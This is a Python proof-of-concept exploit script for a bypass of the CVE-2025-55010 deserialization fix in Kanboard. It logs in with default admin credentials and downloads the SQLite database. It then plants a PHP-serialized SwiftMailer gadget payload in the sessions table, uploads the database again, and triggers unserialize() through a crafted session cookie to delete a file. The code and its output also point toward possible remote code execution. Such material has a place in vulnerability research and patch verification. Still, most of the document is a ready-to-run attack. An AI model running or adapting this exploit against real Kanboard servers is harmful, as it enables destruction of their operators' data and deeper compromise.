#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Kanboard Fix Bypass — Session Table Deserialization
# CVE            : CVE-2025-55010
# Vendor         : Kanboard
# Product        : Kanboard
# Affected       : All versions using SESSION_HANDLER='db' (default)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.1 (Critical)
# Platform       : PHP / SQLite
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# Bypasses the v1.2.47 fix via PHP session_start() deserialization.
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-55010 Bypass PoC — Session Table Deserialization

BYPASS TECHNIQUE:
    The fix for CVE-2025-55010 patches ProjectActivityEventFormatter::unserializeEvent()
    to return [] instead of calling unserialize(). However, Kanboard uses database-backed
    PHP sessions by default (SESSION_HANDLER='db'). PHP's session_start() internally calls
    unserialize() on data from the `sessions` table WITHOUT allowed_classes restrictions.

    An admin who can download/upload the SQLite database can inject a malicious
    PHP-serialized payload into the `sessions` table. When ANY request is sent with
    the crafted session cookie (KB_SID=<injected_id>), PHP's session_start() deserializes
    the malicious payload, instantiating arbitrary objects and triggering gadget chains.

PROOF APPROACH:
    1. Login as admin, download database via web interface
    2. Create marker file via bind mount (host ./poc → container /opt/poc)
    3. Load pre-generated session payload (TemporaryFileByteStream __destruct)
    4. Inject malicious session row into sessions table
    5. Upload modified database via web interface
    6. Send HTTP request with crafted session cookie
    7. Verify marker file was deleted (proves arbitrary object deserialization)

PREREQUISITES:
    - Kanboard with SESSION_HANDLER='db' (default)
    - Admin credentials (default: admin/admin)
    - Pre-generated session payload (created at Docker build time)

REFERENCES:
    - CVE-2025-55010
    - GHSA-rfjg-6m84-crj2
"""

import sys
import os
import json
import gzip
import sqlite3
import tempfile
import base64
import re
import time
import http.client
import urllib.parse
from html.parser import HTMLParser

POC_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_PAYLOAD_FILE = os.path.join(POC_DIR, ".session_payload.bin")
SESSION_PAYLOAD_INFO = os.path.join(POC_DIR, ".session_payload_info.txt")
MARKER_FILE_LOCAL = os.path.join(POC_DIR, ".bypass_marker.txt")
MARKER_CONTENT = "CVE-2025-55010-SESSION-BYPASS-PROOF"
CRAFTED_SESSION_ID = "bypass_" + os.urandom(12).hex()
SESSION_EXPIRE = int(time.time()) + 86400

DEFAULT_USER = "admin"
DEFAULT_PASS = "admin"


class CSRFTokenParser(HTMLParser):
    """Extract CSRF token from Kanboard HTML pages."""
    def __init__(self):
        super().__init__()
        self.csrf_token = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'input' and attrs_dict.get('name') == 'csrf_token':
            self.csrf_token = attrs_dict.get('value')
        if tag == 'a' and 'href' in attrs_dict:
            href = attrs_dict['href']
            if 'csrf_token=' in href:
                match = re.search(r'csrf_token=([a-f0-9]+)', href)
                if match:
                    self.csrf_token = match.group(1)


class KanboardBypass:
    """Bypass exploit using session table deserialization."""

    def __init__(self, host, port=80, username=DEFAULT_USER, password=DEFAULT_PASS):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.session_cookie = None
        self.csrf_token = None

    def _http_request(self, method, path, body=None, headers=None, content_type=None):
        """Make HTTP request, return (status, headers_dict, body_bytes)."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        try:
            hdrs = headers or {}
            if self.session_cookie:
                hdrs['Cookie'] = self.session_cookie
            if content_type:
                hdrs['Content-Type'] = content_type
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            resp_body = resp.read()
            for hname, hval in resp.getheaders():
                if hname.lower() == 'set-cookie':
                    m = re.match(r'(KB_SID=[^;]+)', hval)
                    if m:
                        self.session_cookie = m.group(1)
            return resp.status, dict(resp.getheaders()), resp_body
        finally:
            conn.close()

    def _extract_csrf(self, html):
        """Extract CSRF token from HTML."""
        if isinstance(html, bytes):
            html = html.decode('utf-8', errors='replace')
        parser = CSRFTokenParser()
        parser.feed(html)
        if parser.csrf_token:
            self.csrf_token = parser.csrf_token
            return self.csrf_token
        m = re.search(r'csrf_token["\s]*(?:value="|=)([a-f0-9]{40,})', html)
        if m:
            self.csrf_token = m.group(1)
            return self.csrf_token
        return None

    def login(self):
        """Login to Kanboard as admin."""
        status, _, body = self._http_request("GET", "/login")
        if status != 200:
            status, hdrs, body = self._http_request("GET", "/")
            if status == 302:
                location = hdrs.get('Location', hdrs.get('location', '/login'))
                status, _, body = self._http_request("GET", location)

        csrf = self._extract_csrf(body)
        if not csrf:
            return False

        login_data = urllib.parse.urlencode({
            'csrf_token': csrf,
            'username': self.username,
            'password': self.password
        })
        status, hdrs, _ = self._http_request(
            "POST", "/?controller=AuthController&action=check",
            body=login_data.encode(),
            content_type="application/x-www-form-urlencoded"
        )
        if status in (302, 303):
            location = hdrs.get('Location', hdrs.get('location', '/'))
            self._http_request("GET", location)

        return bool(self.session_cookie)

    def download_database(self):
        """Download the SQLite database via web interface."""
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
        if status == 200:
            self._extract_csrf(body)

        if not self.csrf_token:
            return None

        status, _, body = self._http_request(
            "GET",
            f"/?controller=ConfigController&action=downloadDb&csrf_token={self.csrf_token}"
        )

        if status == 200 and len(body) > 0:
            try:
                return gzip.decompress(body)
            except Exception:
                if body[:6] == b'SQLite':
                    return body
        return None

    def upload_database(self, db_data):
        """Upload the modified database via web interface."""
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=uploadDb")
        if status == 200:
            self._extract_csrf(body)

        if not self.csrf_token:
            status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
            if status == 200:
                self._extract_csrf(body)

        if not self.csrf_token:
            return False

        compressed = gzip.compress(db_data)
        boundary = '----EIPBoundary' + str(int(time.time()))
        body = b''
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="db.sqlite.gz"\r\n'.encode()
        body += b'Content-Type: application/gzip\r\n\r\n'
        body += compressed
        body += f'\r\n--{boundary}--\r\n'.encode()

        upload_url = f"/?controller=ConfigController&action=saveUploadedDb&csrf_token={self.csrf_token}"
        status, _, _ = self._http_request(
            "POST", upload_url, body=body,
            content_type=f"multipart/form-data; boundary={boundary}"
        )
        return status in (200, 302, 303)

    def send_request_with_session(self, session_id):
        """Send HTTP request using a specific session ID to trigger deserialization."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        try:
            conn.request("GET", "/login", headers={"Cookie": f"KB_SID={session_id}"})
            resp = conn.getresponse()
            body = resp.read()
            return resp.status, body
        finally:
            conn.close()


def main():
    print("=" * 72)
    print("CVE-2025-55010 BYPASS PoC: Session Table Deserialization")
    print("Bypass: PHP session_start() unserialize() via sessions table")
    print("=" * 72)

    # Determine target
    if len(sys.argv) >= 2:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) >= 3 else 8881
    else:
        host = "localhost"
        port = 8881

    print(f"[*] Target: http://{host}:{port}")
    exploit = KanboardBypass(host, port)

    # ===================================================================
    # Step 0: Login and verify target is accessible
    # ===================================================================
    print("\n[*] Step 0: Logging in to patched Kanboard...")
    if not exploit.login():
        print("[-] Login failed!")
        sys.exit(1)
    print(f"    [+] Login successful: {exploit.session_cookie[:30]}...")

    # ===================================================================
    # Step 1: Create marker file via bind mount
    # ===================================================================
    print(f"\n[*] Step 1: Creating marker file via bind mount...")
    with open(MARKER_FILE_LOCAL, "w") as f:
        f.write(MARKER_CONTENT)
    if os.path.exists(MARKER_FILE_LOCAL):
        print(f"    [+] Marker file created: {MARKER_FILE_LOCAL}")
        print(f"    [+] Container sees it at: /opt/poc/.bypass_marker.txt")
    else:
        print(f"    [-] Failed to create marker file!")
        sys.exit(1)

    # ===================================================================
    # Step 2: Load pre-generated session payload
    # ===================================================================
    print(f"\n[*] Step 2: Loading pre-generated session payload...")

    if not os.path.exists(SESSION_PAYLOAD_FILE):
        print(f"    [-] Session payload not found: {SESSION_PAYLOAD_FILE}")
        print("    Ensure the patched container has started (it copies payloads to ./poc/)")
        sys.exit(1)

    with open(SESSION_PAYLOAD_FILE, "rb") as f:
        session_payload = f.read()

    print(f"    [+] Payload loaded ({len(session_payload)} bytes)")

    # Read payload info
    if os.path.exists(SESSION_PAYLOAD_INFO):
        with open(SESSION_PAYLOAD_INFO, "r") as f:
            print(f"    [+] Payload info: {f.read().strip()}")

    if b"Swift_ByteStream" in session_payload and b"|" in session_payload:
        print(f"    [+] Payload validated: contains SwiftMailer object in PHP session format")
    else:
        print(f"    [-] Unexpected payload format!")
        print(f"    First 200 bytes: {session_payload[:200]}")

    # ===================================================================
    # Step 3: Download DB, inject session, upload DB
    # ===================================================================
    print(f"\n[*] Step 3: Injecting malicious session into database...")
    print(f"    Crafted session ID: {CRAFTED_SESSION_ID}")

    db_data = exploit.download_database()
    if not db_data:
        print("    [-] Failed to download database!")
        sys.exit(1)
    print(f"    [+] Downloaded database ({len(db_data)} bytes)")

    # Modify the database: inject session row
    with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp:
        tmp.write(db_data)
        tmp_db = tmp.name

    try:
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()

        # Check sessions table
        cursor.execute("SELECT sql FROM sqlite_master WHERE name='sessions'")
        schema = cursor.fetchone()
        print(f"    Sessions table: {'EXISTS' if schema else 'MISSING'}")

        # Count existing sessions
        cursor.execute("SELECT COUNT(*) FROM sessions")
        count = cursor.fetchone()[0]
        print(f"    Existing sessions: {count}")

        # Insert malicious session (use binary data)
        cursor.execute(
            "INSERT OR REPLACE INTO sessions (id, expire_at, data) VALUES (?, ?, ?)",
            (CRAFTED_SESSION_ID, SESSION_EXPIRE, session_payload)
        )
        conn.commit()

        # Verify
        cursor.execute("SELECT id, expire_at, length(data) FROM sessions WHERE id=?",
                       (CRAFTED_SESSION_ID,))
        row = cursor.fetchone()
        print(f"    [+] Injected session: id={row[0]}, expires={row[1]}, data_len={row[2]}")
        conn.close()

        # Read modified database
        with open(tmp_db, 'rb') as f:
            modified_db = f.read()
    finally:
        os.unlink(tmp_db)

    # Upload the modified database
    print(f"    [*] Uploading modified database via web...")
    if not exploit.upload_database(modified_db):
        print("    [-] Failed to upload database!")
        sys.exit(1)
    print(f"    [+] Modified database uploaded via web")

    # ===================================================================
    # Step 4: Trigger session deserialization
    # ===================================================================
    print(f"\n[*] Step 4: Triggering session deserialization...")
    print(f"    Sending request with Cookie: KB_SID={CRAFTED_SESSION_ID}")
    print(f"    PHP flow: session_start() -> SessionHandler::read() -> unserialize(data)")
    print(f"    This calls unserialize() on attacker-controlled data from sessions table")
    print(f"    The CVE-2025-55010 fix does NOT cover this code path!")

    # Send multiple requests to ensure session_start() processes our data
    for i, path in enumerate(["/login", "/", "/dashboard"], 1):
        status, body = exploit.send_request_with_session(CRAFTED_SESSION_ID)
        print(f"    Request {i} ({path}): status={status}")
        time.sleep(0.5)

    # ===================================================================
    # Step 5: Verify bypass via bind mount
    # ===================================================================
    print(f"\n[*] Step 5: Verifying bypass (checking if marker file was deleted)...")
    time.sleep(1)

    marker_exists = os.path.exists(MARKER_FILE_LOCAL)

    print()
    print("=" * 72)
    print("BYPASS VERIFICATION RESULTS")
    print("=" * 72)

    if not marker_exists:
        print(f"[+] ======= BYPASS SUCCESSFUL =======")
        print(f"[+] Marker file {MARKER_FILE_LOCAL} was DELETED!")
        print(f"[+]")
        print(f"[+] PROOF CHAIN:")
        print(f"[+]   1. Malicious PHP-serialized data injected into `sessions` table")
        print(f"[+]   2. HTTP request sent with crafted session cookie: KB_SID={CRAFTED_SESSION_ID[:30]}...")
        print(f"[+]   3. PHP session_start() -> SessionHandler::read() -> returned malicious data")
        print(f"[+]   4. PHP internally called unserialize() on the session data (NO allowed_classes!)")
        print(f"[+]   5. Swift_ByteStream_TemporaryFileByteStream object instantiated")
        print(f"[+]   6. __destruct() triggered -> unlink('/opt/poc/.bypass_marker.txt') -> FILE DELETED")
        print(f"[+]")
        print(f"[+] BYPASS SIGNIFICANCE:")
        print(f"[+]   - The CVE-2025-55010 fix patches ProjectActivityEventFormatter::unserializeEvent()")
        print(f"[+]   - But Kanboard's database-backed session handler provides an UNPATCHED sink")
        print(f"[+]   - Same prerequisite: admin access + SQLite database upload")
        print(f"[+]   - Same gadget chain: SwiftMailer (bundled with Kanboard)")
        print(f"[+]   - Impact: arbitrary file deletion via __destruct()")
        print(f"[+]   - Potential escalation to RCE via alternative gadget chains")
        return True

    else:
        print(f"[-] Marker file still exists — bypass did not succeed")
        print(f"[-] This may indicate session.use_strict_mode is rejecting crafted IDs")
        print(f"[-] or the session handler did not process our injected data")

        # Clean up
        try:
            os.remove(MARKER_FILE_LOCAL)
        except OSError:
            pass

        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
